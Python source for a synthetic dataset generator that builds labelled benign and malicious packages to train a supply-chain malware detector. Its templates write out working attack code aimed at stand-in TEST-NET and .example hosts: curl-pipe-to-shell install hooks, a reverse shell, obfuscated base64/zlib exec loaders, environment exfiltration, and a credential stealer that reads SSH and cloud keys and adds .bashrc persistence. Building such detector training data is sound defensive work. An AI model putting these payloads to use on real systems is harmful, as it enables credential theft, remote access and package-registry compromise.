"""Synthetic Python package generator (benign vs. malicious source code + registry metadata).

Each sample is a small package: ``setup.py``, ``<pkg>/__init__.py`` and optional
modules, assembled from randomised code templates, plus registry metadata
(package age, maintainer account age, downloads, ...).

Families
    benign                  realistic library code, incl. legitimately "risky-looking"
                            patterns (native build hooks, HTTP clients, plugin loaders,
                            embedded base64 assets, git subprocess calls)
    typosquatting           look-alike name + install hook exfiltrating host data
    malicious_build_hook    cmdclass hook that downloads and runs a script
    backdoored_dependency   established package whose ``__init__`` runs an
                            obfuscated, encoded payload at import time
    dependency_confusion    internal-looking name, huge version, import-time recon
                            + DNS/HTTP exfiltration in ``setup.py``
    credential_stealer      (NOVEL, withheld from the classifier) thread started at
                            import that reads SSH/cloud credentials and installs
                            shell-profile persistence

Safety: the generated code is only ever *parsed*, never executed. Network
indicators use reserved TEST-NET addresses (RFC 5737) and ``.example`` domains.
"""

from __future__ import annotations

import base64
import zlib
from dataclasses import dataclass, field
from string import Template
from typing import Any

import numpy as np

from ai_engine.config import (
    BENIGN_LABEL,
    INTERNAL_NAMESPACE_PREFIXES,
    KNOWN_ATTACK_TYPES,
    NOVEL_ATTACK_TYPES,
    POPULAR_PACKAGES,
)

_SYLLABLES = ("ka", "lo", "mi", "ne", "ru", "ta", "vex", "zen", "qua", "bit", "flux", "nod", "py", "cor",
              "lib", "kit", "io", "dex", "ar", "el", "um", "sha", "tri", "gor", "pli", "wen", "mo", "fy")
_WORDS = ("data", "item", "value", "record", "entry", "node", "token", "chunk", "field", "batch", "row", "key")
_TEST_NETS = ("192.0.2", "198.51.100", "203.0.113")

# --------------------------------------------------------------------------- #
# Benign code templates: (imports, body)
# --------------------------------------------------------------------------- #
BENIGN_SNIPPETS: dict[str, tuple[tuple[str, ...], str]] = {
    "normalize": ((), '''
def $fn($a, strip=True):
    """Normalise a sequence of ${w}s."""
    out = []
    for $w in $a:
        if $w is None:
            continue
        text = str($w)
        out.append(text.strip().lower() if strip else text)
    return out
'''),
    "stats": (("import math",), '''
def $fn($a):
    """Mean and standard deviation of numeric ${w}s."""
    values = [float(v) for v in $a]
    if not values:
        return 0.0, 0.0
    mean = sum(values) / len(values)
    var = sum((v - mean) ** 2 for v in values) / len(values)
    return mean, math.sqrt(var)
'''),
    "dataclass": (("from dataclasses import dataclass, field",), '''
@dataclass
class ${Cls}:
    name: str
    size: int = 0
    tags: list = field(default_factory=list)

    def add_tag(self, tag):
        if tag not in self.tags:
            self.tags.append(tag)
        return self
'''),
    "json_load": (("import json",), '''
def $fn(path):
    """Load a JSON ${w} file."""
    with open(path, encoding="utf-8") as fh:
        return json.load(fh)
'''),
    "cache_write": (("import json", "import os"), '''
def $fn($a, path):
    """Persist ${w}s to a local cache file."""
    os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
    with open(path, "w", encoding="utf-8") as fh:
        json.dump($a, fh)
'''),
    "http_client": (("import json", "import urllib.request"), '''
class ${Cls}Client:
    """Minimal REST client for the $name API."""

    base_url = "https://api.$name.example.com/v1"

    def __init__(self, token=None, timeout=10):
        self.token = token
        self.timeout = timeout

    def get(self, resource):
        req = urllib.request.Request(f"{self.base_url}/{resource}")
        if self.token:
            req.add_header("Authorization", f"Bearer {self.token}")
        with urllib.request.urlopen(req, timeout=self.timeout) as resp:
            return json.loads(resp.read())
'''),
    "plugin_loader": (("import importlib",), '''
def $fn(names):
    """Load optional $name plugins by module name."""
    plugins = {}
    for plugin in names:
        try:
            plugins[plugin] = importlib.import_module(f"${pkg}.plugins.{plugin}")
        except ImportError:
            continue
    return plugins
'''),
    "retry": (("import functools", "import time"), '''
def $fn(attempts=3, delay=0.5):
    """Retry decorator with linear backoff."""
    def decorator(func):
        @functools.wraps(func)
        def wrapper(*args, **kwargs):
            for attempt in range(attempts):
                try:
                    return func(*args, **kwargs)
                except Exception:
                    if attempt == attempts - 1:
                        raise
                    time.sleep(delay * (attempt + 1))
        return wrapper
    return decorator
'''),
    "cli": (("import argparse",), '''
def main(argv=None):
    parser = argparse.ArgumentParser(prog="$name")
    parser.add_argument("paths", nargs="*")
    parser.add_argument("--verbose", action="store_true")
    args = parser.parse_args(argv)
    for path in args.paths:
        print(path)
    return 0
'''),
    "git_version": (("import subprocess",), '''
def $fn():
    """Best-effort git revision for diagnostics."""
    try:
        out = subprocess.run(["git", "rev-parse", "--short", "HEAD"], capture_output=True, text=True, check=False)
        return out.stdout.strip() or None
    except OSError:
        return None
'''),
    "icon_asset": (("import base64",), '''
_ICON_PNG = "$icon"


def $fn():
    """Decoded PNG bytes of the bundled icon."""
    return base64.b64decode(_ICON_PNG)
'''),
    "literal_eval": (("import ast",), '''
def $fn(text):
    """Safely parse a Python literal from configuration."""
    return ast.literal_eval(text)
'''),
    "env_config": (("import os",), '''
def $fn():
    """Read $name settings from the environment."""
    return {
        "debug": os.environ.get("${NAME}_DEBUG", "0") == "1",
        "cache_dir": os.getenv("${NAME}_CACHE", "~/.cache/$name"),
    }
'''),
    "worker": (("import queue", "import threading"), '''
def $fn(jobs, handler, workers=4):
    """Process jobs on a small thread pool."""
    q = queue.Queue()
    for job in jobs:
        q.put(job)

    def run():
        while not q.empty():
            handler(q.get())
            q.task_done()

    threads = [threading.Thread(target=run) for _ in range(workers)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
'''),
}

SETUP_TEMPLATES: dict[str, str] = {
    "plain": '''from setuptools import setup

setup(
    name="$name",
    version="$version",
    packages=["$pkg"],
    python_requires=">=3.8",
)
''',
    "full": '''from setuptools import find_packages, setup

with open("README.md", encoding="utf-8") as fh:
    long_description = fh.read()

setup(
    name="$name",
    version="$version",
    description="Utilities for $name",
    long_description=long_description,
    packages=find_packages(exclude=["tests"]),
    install_requires=$requires,
    entry_points={"console_scripts": ["$name=$pkg.cli:main"]},
)
''',
    "version_exec": '''from setuptools import setup

about = {}
with open("$pkg/__version__.py") as fh:
    exec(fh.read(), about)

setup(name="$name", version=about["__version__"], packages=["$pkg"])
''',
    "build_ext": '''import os
import subprocess
from setuptools import setup, Extension
from setuptools.command.build_ext import build_ext


class CMakeBuild(build_ext):
    def run(self):
        build_dir = os.path.abspath(self.build_temp)
        os.makedirs(build_dir, exist_ok=True)
        subprocess.check_call(["cmake", os.path.abspath("native"), "-DCMAKE_BUILD_TYPE=Release"], cwd=build_dir)
        subprocess.check_call(["cmake", "--build", "."], cwd=build_dir)
        super().run()


setup(
    name="$name",
    version="$version",
    packages=["$pkg"],
    ext_modules=[Extension("$pkg._native", sources=[])],
    cmdclass={"build_ext": CMakeBuild},
)
''',
}

#: Benign-but-risky-looking patterns common in real packages; static analysis alone
#: tends to flag these, so they test whether ML + metadata can suppress false positives.
GRAY_SETUP_DOWNLOADER = '''import os
import tarfile
import urllib.request
from setuptools import setup
from setuptools.command.install import install

RELEASE = "https://github.example/$name/releases/download/v$version/$pkg-bin.tar.gz"


class FetchBinaries(install):
    def run(self):
        target = os.path.join(self.build_lib or "build", "$pkg", "bin")
        os.makedirs(target, exist_ok=True)
        archive, _ = urllib.request.urlretrieve(RELEASE)
        with tarfile.open(archive) as tar:
            tar.extractall(target)
        install.run(self)


setup(name="$name", version="$version", packages=["$pkg"], cmdclass={"install": FetchBinaries})
'''
GRAY_TELEMETRY = '''import json
import os
import platform
import threading
import urllib.request

_ENDPOINT = "https://telemetry.$name.example.com/v1/events"


def _report():
    if os.environ.get("${NAME}_NO_TELEMETRY"):
        return
    payload = {"python": platform.python_version(), "os": platform.system(), "package": "$name"}
    try:
        urllib.request.urlopen(urllib.request.Request(_ENDPOINT, data=json.dumps(payload).encode()), timeout=2)
    except Exception:
        pass


threading.Thread(target=_report, daemon=True).start()
'''
GRAY_ARMORED = '''from .pytransform import pyarmor_runtime

pyarmor_runtime()
__pyarmor__(__name__, __file__, $blob)
'''

# --------------------------------------------------------------------------- #
# Malicious payload templates
# --------------------------------------------------------------------------- #
EXFIL_FUNC = '''
def $fn():
    info = {"host": socket.gethostname(), "user": getpass.getuser(), "cwd": os.getcwd(), "env": dict(os.environ)}
    body = json.dumps(info).encode()
    try:
        urllib.request.urlopen(urllib.request.Request("$url", data=body), timeout=3)
    except Exception:
        pass
'''
EXFIL_IMPORTS = ("import getpass", "import json", "import os", "import socket", "import urllib.request")

SHELL_DOWNLOAD = (
    'os.system("curl -fsSL $url | sh >/dev/null 2>&1")',
    'subprocess.Popen(["/bin/sh", "-c", "wget -qO- $url | sh"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)',
    'subprocess.call("curl -s $url -o /tmp/.$fn && chmod +x /tmp/.$fn && /tmp/.$fn", shell=True)',
)

INNER_PAYLOADS = (
    "import os,socket,subprocess\ns=socket.create_connection(('$ip',$port))\n"
    "[os.dup2(s.fileno(),f) for f in (0,1,2)]\nsubprocess.call(['/bin/sh','-i'])\n",
    "import os,json,urllib.request\nurllib.request.urlopen('$url',data=json.dumps(dict(os.environ)).encode())\n",
    "import urllib.request,os\nexec(urllib.request.urlopen('$url').read())\n",
)


def _encoded_exec(rng: np.random.Generator, inner: str) -> tuple[tuple[str, ...], str]:
    """Wrap ``inner`` Python source in one of several obfuscated exec loaders."""
    raw = inner.encode()
    variant = int(rng.integers(0, 5))
    if variant == 0:
        return ("import base64",), f'exec(base64.b64decode("{base64.b64encode(raw).decode()}").decode())'
    if variant == 1:
        blob = base64.b64encode(zlib.compress(raw)).decode()
        return ("import base64", "import zlib"), f'exec(zlib.decompress(base64.b64decode("{blob}")))'
    if variant == 2:
        return (), f'getattr(__builtins__, "ex" + "ec")(__import__("base64").b64decode("{base64.b64encode(raw).decode()}"))'
    if variant == 3:
        return (), f'exec(bytes.fromhex("{raw.hex()}").decode())'
    # variant 4: reversed base64 string
    rev = base64.b64encode(raw).decode()[::-1]
    return ("import base64",), f'_p = "{rev}"\nexec(base64.b64decode(_p[::-1]))'


def make_typosquat(name: str, rng: np.random.Generator) -> str:
    """Plausible look-alike of ``name`` (swap, drop, insert, substitute, separator, suffix)."""
    letters = "abcdefghijklmnopqrstuvwxyz"
    for _ in range(20):
        chars = list(name)
        op = int(rng.integers(0, 6))
        if op == 0 and len(chars) > 3:
            i = int(rng.integers(0, len(chars) - 1))
            chars[i], chars[i + 1] = chars[i + 1], chars[i]
        elif op == 1 and len(chars) > 4:
            del chars[int(rng.integers(0, len(chars)))]
        elif op == 2:
            chars.insert(int(rng.integers(0, len(chars) + 1)), str(rng.choice(list(letters))))
        elif op == 3:
            chars[int(rng.integers(0, len(chars)))] = str(rng.choice(list(letters)))
        elif op == 4:
            chars = list(name.replace("-", "_") if "-" in name else name[: len(name) // 2] + "-" + name[len(name) // 2:])
        else:
            chars = list(name + str(rng.choice(["-py", "s", "2", "-lib"])))
        candidate = "".join(chars)
        if candidate != name and candidate not in POPULAR_PACKAGES:
            return candidate
    return f"{name}-py"


@dataclass
class PackageGeneratorConfig:
    """Dataset composition.

    Attributes:
        n_benign: Number of benign packages.
        attack_ratio: Known-attack packages as a fraction of ``n_benign``.
        novel_ratio: Novel-attack packages as a fraction of ``n_benign``.
        stealth_rate: Fraction of attacks with weakened metadata signals.
        seed: RNG seed (identical configs give identical datasets).
    """

    n_benign: int = 900
    attack_ratio: float = 0.30
    novel_ratio: float = 0.05
    stealth_rate: float = 0.25
    seed: int = 42
    attack_mix: dict[str, float] = field(default_factory=lambda: dict.fromkeys(KNOWN_ATTACK_TYPES, 1.0))


class SyntheticPackageGenerator:
    """Deterministic generator of labelled package samples.

    Each sample is ``{"package_id", "name", "files", "metadata", "attack_type",
    "is_malicious", "is_novel"}``.
    """

    def __init__(self, config: PackageGeneratorConfig | None = None) -> None:
        self.config = config or PackageGeneratorConfig()
        self.rng = np.random.default_rng(self.config.seed)
        self._names: set[str] = set(POPULAR_PACKAGES)
        self._counter = 0

    # Public ---------------------------------------------------------------- #
    def generate(self) -> list[dict[str, Any]]:
        """Generate the full dataset in a shuffled, reproducible order."""
        cfg = self.config
        samples = [self._benign() for _ in range(cfg.n_benign)]
        total_w = sum(cfg.attack_mix.values())
        builders = {
            "typosquatting": self._typosquatting,
            "malicious_build_hook": self._build_hook,
            "backdoored_dependency": self._backdoored,
            "dependency_confusion": self._dependency_confusion,
            "credential_stealer": self._credential_stealer,
        }
        for attack, weight in cfg.attack_mix.items():
            for _ in range(int(round(cfg.n_benign * cfg.attack_ratio * weight / total_w))):
                samples.append(builders[attack]())
        for attack in NOVEL_ATTACK_TYPES:
            for _ in range(int(round(cfg.n_benign * cfg.novel_ratio))):
                samples.append(builders[attack]())
        order = self.rng.permutation(len(samples))
        return [samples[i] for i in order]

    def file_level_samples(self, samples: list[dict[str, Any]], benign_rate: float = 0.5) -> list[dict[str, Any]]:
        """Single-file samples matching how ``scanner.py`` scores files one at a time.

        * a ``benign_rate`` fraction of benign packages is split into one sample per file (benign);
        * every attack package contributes its payload file(s) alone, with the attack label.

        Benign files *inside* attack packages are not used, so no file gets a misleading label.
        """
        out: list[dict[str, Any]] = []
        for sample in samples:
            if sample["is_malicious"]:
                paths = sample.get("payload_files", [])
            elif self.rng.random() < benign_rate:
                paths = list(sample["files"])
            else:
                paths = []
            for path in paths:
                self._counter += 1
                out.append({**sample, "package_id": f"file-{self._counter:06d}", "files": {path: sample["files"][path]},
                            "payload_files": [path] if sample["is_malicious"] else [], "granularity": "file"})
        return out

    # Helpers --------------------------------------------------------------- #
    def _pick(self, seq: tuple[str, ...] | list[str]) -> str:
        return str(seq[int(self.rng.integers(0, len(seq)))])

    def _new_name(self, prefix: str = "") -> str:
        for _ in range(100):
            name = prefix + "".join(self._pick(_SYLLABLES) for _ in range(int(self.rng.integers(2, 4))))
            if self.rng.random() < 0.3:
                name += "-" + self._pick(("utils", "client", "sdk", "tools", "core"))
            if name not in self._names:
                self._names.add(name)
                return name
        self._counter += 1
        return f"{prefix}pkg{self._counter}"

    def _ip_url(self) -> str:
        return f"http://{self._pick(_TEST_NETS)}.{int(self.rng.integers(2, 254))}:{self._pick(('80', '8080', '4444', '443'))}/{self._pick(_WORDS)}"

    def _domain_url(self) -> str:
        return f"https://{self._pick(_SYLLABLES)}{self._pick(_SYLLABLES)}-{self._pick(_WORDS)}.example/{self._pick(_WORDS)}"

    def _attacker_url(self) -> str:
        return self._ip_url() if self.rng.random() < 0.5 else self._domain_url()

    def _ctx(self, name: str) -> dict[str, str]:
        pkg = name.replace("-", "_").replace(".", "_")
        cls = "".join(p.capitalize() for p in pkg.split("_"))
        icon = base64.b64encode(self.rng.bytes(int(self.rng.integers(60, 200)))).decode()
        return {
            "name": name, "pkg": pkg, "Cls": cls, "NAME": pkg.upper(), "icon": icon,
            "fn": f"{self._pick(('get', 'load', 'build', 'make', 'parse', 'collect'))}_{self._pick(_WORDS)}",
            "a": f"{self._pick(_WORDS)}s", "w": self._pick(_WORDS),
            "version": f"{int(self.rng.integers(0, 5))}.{int(self.rng.integers(0, 20))}.{int(self.rng.integers(0, 10))}",
            "requires": repr(sorted({self._pick(POPULAR_PACKAGES) for _ in range(int(self.rng.integers(0, 4)))})),
        }

    def _benign_module(self, ctx: dict[str, str], k_min: int = 1, k_max: int = 5) -> str:
        keys = list(BENIGN_SNIPPETS)
        chosen = self.rng.choice(keys, size=int(self.rng.integers(k_min, k_max + 1)), replace=False)
        imports: set[str] = set()
        bodies: list[str] = []
        for key in chosen:
            imp, body = BENIGN_SNIPPETS[str(key)]
            local = dict(ctx, fn=f"{self._pick(('get', 'load', 'build', 'make', 'parse'))}_{self._pick(_WORDS)}_{key}")
            imports.update(imp)
            bodies.append(Template(body).safe_substitute(local))
        return "\n".join(sorted(imports)) + ("\n\n" if imports else "") + "\n".join(bodies)

    def _benign_files(self, ctx: dict[str, str], setup_kind: str | None = None) -> dict[str, str]:
        kind = setup_kind or self._pick(("plain", "plain", "full", "full", "version_exec", "build_ext"))
        files = {
            "setup.py": Template(SETUP_TEMPLATES[kind]).safe_substitute(ctx),
            f"{ctx['pkg']}/__init__.py": f'"""{ctx["name"]} package."""\n\n__version__ = "{ctx["version"]}"\n'
            + (self._benign_module(ctx, 0, 2) if self.rng.random() < 0.5 else ""),
        }
        if kind == "version_exec":
            files[f"{ctx['pkg']}/__version__.py"] = f'__version__ = "{ctx["version"]}"\n'
        for i in range(int(self.rng.integers(1, 4))):
            files[f"{ctx['pkg']}/{self._pick(_WORDS)}_{i}.py"] = self._benign_module(ctx)
        return files

    def _metadata(self, **overrides: float) -> dict[str, float]:
        rng = self.rng
        meta = {
            "package_age_days": float(rng.lognormal(6.3, 0.9)),
            "maintainer_account_age_days": float(rng.lognormal(7.0, 0.7)),
            "num_maintainers": int(rng.integers(1, 6)),
            "maintainer_changed": int(rng.random() < 0.02),
            "version_major": int(rng.integers(0, 6)),
            "version_jump": int(rng.random() < 0.05),
            "downloads_weekly": int(rng.lognormal(8, 2.0)),
            "signed_commit_ratio": float(np.clip(rng.beta(5, 2), 0, 1)),
        }
        meta.update(overrides)
        return meta

    def _attack_metadata(self, **overrides: float) -> dict[str, float]:
        """Attack metadata; stealthy samples fall back to benign-looking metadata."""
        if self.rng.random() < self.config.stealth_rate:
            return self._metadata()
        return self._metadata(**overrides)

    def _sample(self, name: str, files: dict[str, str], metadata: dict[str, float], attack: str,
                payload_files: tuple[str, ...] = ()) -> dict[str, Any]:
        self._counter += 1
        return {
            "package_id": f"pkg-{self._counter:06d}",
            "name": name,
            "files": files,
            "metadata": metadata,
            "attack_type": attack,
            "is_malicious": int(attack != BENIGN_LABEL),
            "is_novel": int(attack in NOVEL_ATTACK_TYPES),
            "payload_files": list(payload_files),  # files that actually carry the malicious code
        }

    def _hook_class(self, base: str, body_lines: list[str]) -> str:
        body = "\n".join(f"        {line}" for line in "\n".join(body_lines).splitlines())
        return f"class PostInstall({base}):\n    def run(self):\n{body}\n        {base}.run(self)\n"

    # Families ---------------------------------------------------------------- #
    def _benign(self) -> dict[str, Any]:
        roll = self.rng.random()
        if roll < 0.06:
            name = self._pick(POPULAR_PACKAGES)
            meta = self._metadata(package_age_days=float(self.rng.uniform(2000, 5000)),
                                  downloads_weekly=int(self.rng.lognormal(15, 1)), num_maintainers=int(self.rng.integers(4, 15)))
        elif roll < 0.11:
            name = self._new_name(self._pick(INTERNAL_NAMESPACE_PREFIXES))
            meta = self._metadata(downloads_weekly=int(self.rng.integers(0, 50)))
        else:
            name = self._new_name()
            meta = self._metadata()
        ctx = self._ctx(name)
        files = self._benign_files(ctx)
        if self.rng.random() < 0.15:
            self._add_gray_pattern(ctx, files)
        return self._sample(name, files, meta, BENIGN_LABEL)

    def _add_gray_pattern(self, ctx: dict[str, str], files: dict[str, str]) -> None:
        """Inject a legitimate pattern that resembles malicious behaviour."""
        kind = self._pick(("downloader", "telemetry", "armored"))
        init = f"{ctx['pkg']}/__init__.py"
        if kind == "downloader":
            files["setup.py"] = Template(GRAY_SETUP_DOWNLOADER).safe_substitute(ctx)
        elif kind == "telemetry":
            files[f"{ctx['pkg']}/_telemetry.py"] = Template(GRAY_TELEMETRY).safe_substitute(ctx)
            files[init] += "\nfrom . import _telemetry  # noqa: F401\n"
        else:
            blob = repr(self.rng.bytes(int(self.rng.integers(200, 600))))
            files[f"{ctx['pkg']}/core.py"] = Template(GRAY_ARMORED).safe_substitute(ctx, blob=blob)
            files[f"{ctx['pkg']}/pytransform/__init__.py"] = "def pyarmor_runtime():\n    return None\n"

    def _typosquatting(self) -> dict[str, Any]:
        name = make_typosquat(self._pick(POPULAR_PACKAGES), self.rng)
        ctx = self._ctx(name)
        ctx["url"] = self._attacker_url()
        if self.rng.random() < 0.3:
            return self._runtime_typosquat(name, ctx)
        lines = [f"{ctx['fn']}()"]
        if self.rng.random() < 0.5:
            lines.append(Template(self._pick(SHELL_DOWNLOAD)).safe_substitute(ctx, url=self._attacker_url()))
        setup = (
            "\n".join(sorted({*EXFIL_IMPORTS, "import subprocess"})) + "\n"
            "from setuptools import setup\nfrom setuptools.command.install import install\n"
            + Template(EXFIL_FUNC).safe_substitute(ctx) + "\n\n" + self._hook_class("install", lines)
            + f'\n\nsetup(name="{name}", version="{ctx["version"]}", packages=["{ctx["pkg"]}"], cmdclass={{"install": PostInstall}})\n'
        )
        files = {"setup.py": setup, f"{ctx['pkg']}/__init__.py": self._benign_module(ctx, 1, 2)}
        meta = self._attack_metadata(package_age_days=float(self.rng.uniform(0, 20)),
                                     maintainer_account_age_days=float(self.rng.uniform(0, 30)), num_maintainers=1,
                                     downloads_weekly=int(self.rng.lognormal(3, 1)),
                                     signed_commit_ratio=float(self.rng.uniform(0, 0.2)))
        return self._sample(name, files, meta, "typosquatting", ("setup.py",))

    def _runtime_typosquat(self, name: str, ctx: dict[str, str]) -> dict[str, Any]:
        """Typosquat whose exfiltration hides in an API function (no install hook)."""
        module = (
            "\n".join(EXFIL_IMPORTS) + "\n" + Template(EXFIL_FUNC).safe_substitute(ctx)
            + f"\n\ndef get(url, **kwargs):\n    {ctx['fn']}()\n    return urllib.request.urlopen(url, **kwargs)\n"
        )
        files = self._benign_files(ctx, setup_kind="plain")
        files[f"{ctx['pkg']}/api.py"] = module
        meta = self._attack_metadata(package_age_days=float(self.rng.uniform(0, 30)),
                                     maintainer_account_age_days=float(self.rng.uniform(0, 30)), num_maintainers=1,
                                     downloads_weekly=int(self.rng.lognormal(3, 1)),
                                     signed_commit_ratio=float(self.rng.uniform(0, 0.2)))
        return self._sample(name, files, meta, "typosquatting", (f"{ctx['pkg']}/api.py",))

    def _build_hook(self) -> dict[str, Any]:
        name = self._new_name()
        ctx = self._ctx(name)
        base = self._pick(("install", "develop", "egg_info"))
        if self.rng.random() < 0.6:
            imports = ("import os", "import subprocess")
            action = Template(self._pick(SHELL_DOWNLOAD)).safe_substitute(ctx, url=self._attacker_url())
        else:
            inner = Template(self._pick(INNER_PAYLOADS)).safe_substitute(
                ip=f"{self._pick(_TEST_NETS)}.{int(self.rng.integers(2, 254))}", port=int(self.rng.integers(1024, 65000)),
                url=self._attacker_url())
            imports, action = _encoded_exec(self.rng, inner)
        module = {"install": "install", "develop": "develop", "egg_info": "egg_info"}[base]
        setup = (
            "\n".join(sorted(set(imports))) + "\n"
            f"from setuptools import setup\nfrom setuptools.command.{module} import {base}\n\n\n"
            + self._hook_class(base, [action])
            + f'\n\nsetup(name="{name}", version="{ctx["version"]}", packages=["{ctx["pkg"]}"], cmdclass={{"{base}": PostInstall}})\n'
        )
        files = self._benign_files(ctx)
        files["setup.py"] = setup
        meta = self._attack_metadata(maintainer_changed=int(self.rng.random() < 0.5),
                                     maintainer_account_age_days=float(self.rng.uniform(1, 90)),
                                     version_jump=int(self.rng.random() < 0.4),
                                     signed_commit_ratio=float(self.rng.uniform(0, 0.4)))
        return self._sample(name, files, meta, "malicious_build_hook", ("setup.py",))

    def _backdoored(self) -> dict[str, Any]:
        name = self._new_name()
        ctx = self._ctx(name)
        files = self._benign_files(ctx)
        inner = Template(self._pick(INNER_PAYLOADS)).safe_substitute(
            ip=f"{self._pick(_TEST_NETS)}.{int(self.rng.integers(2, 254))}", port=int(self.rng.integers(1024, 65000)),
            url=self._attacker_url())
        imports, loader = _encoded_exec(self.rng, inner)
        init_path = f"{ctx['pkg']}/__init__.py"
        filler = self._benign_module(ctx, 1, 3)
        files[init_path] = (
            "\n".join(sorted(set(imports))) + ("\n" if imports else "")
            + filler + "\n\ntry:\n" + "\n".join(f"    {ln}" for ln in loader.splitlines()) + "\nexcept Exception:\n    pass\n"
        )
        meta = self._attack_metadata(package_age_days=float(self.rng.uniform(400, 3000)),
                                     maintainer_changed=int(self.rng.random() < 0.6),
                                     maintainer_account_age_days=float(self.rng.uniform(1, 60)),
                                     downloads_weekly=int(self.rng.lognormal(10, 1.5)),
                                     signed_commit_ratio=float(self.rng.uniform(0, 0.5)))
        return self._sample(name, files, meta, "backdoored_dependency", (init_path,))

    def _dependency_confusion(self) -> dict[str, Any]:
        name = self._new_name(self._pick(INTERNAL_NAMESPACE_PREFIXES))
        ctx = self._ctx(name)
        domain = f"{self._pick(_SYLLABLES)}{self._pick(_SYLLABLES)}.example"
        if self.rng.random() < 0.5:
            beacon = (f'data = (getpass.getuser() + "." + socket.gethostname()).encode().hex()[:60]\n'
                      f'try:\n    socket.gethostbyname(data + ".{domain}")\nexcept Exception:\n    pass\n')
        else:
            beacon = (f'info = {{"u": getpass.getuser(), "h": platform.node(), "p": os.getcwd()}}\n'
                      f'try:\n    urllib.request.urlopen("{self._attacker_url()}", data=json.dumps(info).encode(), timeout=2)\n'
                      'except Exception:\n    pass\n')
        setup = (
            "import getpass\nimport json\nimport os\nimport platform\nimport socket\nimport urllib.request\n"
            "from setuptools import setup\n\n" + beacon
            + f'\nsetup(name="{name}", version="{int(self.rng.integers(50, 100))}.0.0", packages=["{ctx["pkg"]}"])\n'
        )
        files = {"setup.py": setup, f"{ctx['pkg']}/__init__.py": f'__version__ = "99.0.0"\n'}
        major = int(self.rng.integers(50, 100))
        meta = self._attack_metadata(package_age_days=float(self.rng.uniform(0, 10)),
                                     maintainer_account_age_days=float(self.rng.uniform(0, 20)), num_maintainers=1,
                                     version_major=major, version_jump=major, downloads_weekly=int(self.rng.integers(0, 80)),
                                     signed_commit_ratio=float(self.rng.uniform(0, 0.2)))
        return self._sample(name, files, meta, "dependency_confusion", ("setup.py",))

    def _credential_stealer(self) -> dict[str, Any]:
        name = self._new_name()
        ctx = self._ctx(name)
        files = self._benign_files(ctx)
        ip = f"{self._pick(_TEST_NETS)}.{int(self.rng.integers(2, 254))}"
        targets = self.rng.choice(["~/.ssh/id_rsa", "~/.aws/credentials", "~/.git-credentials", "~/.npmrc",
                                   "~/.pypirc", "~/.kube/config", "~/.docker/config.json"], size=3, replace=False)
        persistence = self._pick((
            'with open(os.path.expanduser("~/.bashrc"), "a") as fh:\n'
            '        fh.write("\\n(python3 -m $pkg.sync &) 2>/dev/null\\n")',
            'path = os.path.expanduser("~/.config/autostart/$pkg-sync.desktop")\n'
            '    os.makedirs(os.path.dirname(path), exist_ok=True)\n'
            '    with open(path, "w") as fh:\n'
            '        fh.write("[Desktop Entry]\\nExec=python3 -m $pkg.sync\\n")',
        ))
        stealer = Template('''import os
import socket
import threading


def _sync_cache():
    blobs = []
    for target in $targets:
        path = os.path.expanduser(target)
        if os.path.exists(path):
            with open(path, "rb") as fh:
                blobs.append(fh.read())
    try:
        conn = socket.create_connection(("$ip", $port), timeout=5)
        conn.sendall(b"\\n".join(blobs))
        conn.close()
    except OSError:
        pass
    $persistence


threading.Thread(target=_sync_cache, daemon=True).start()
''').safe_substitute(ctx, targets=repr(list(map(str, targets))), ip=ip, port=int(self.rng.integers(1024, 65000)),
                       persistence=Template(persistence).safe_substitute(ctx))
        files[f"{ctx['pkg']}/_cache.py"] = stealer
        init = f"{ctx['pkg']}/__init__.py"
        files[init] = files[init] + "\nfrom . import _cache  # noqa: F401\n"
        meta = self._attack_metadata(maintainer_changed=int(self.rng.random() < 0.3),
                                     signed_commit_ratio=float(self.rng.uniform(0.2, 0.6)))
        return self._sample(name, files, meta, "credential_stealer", (f"{ctx['pkg']}/_cache.py",))
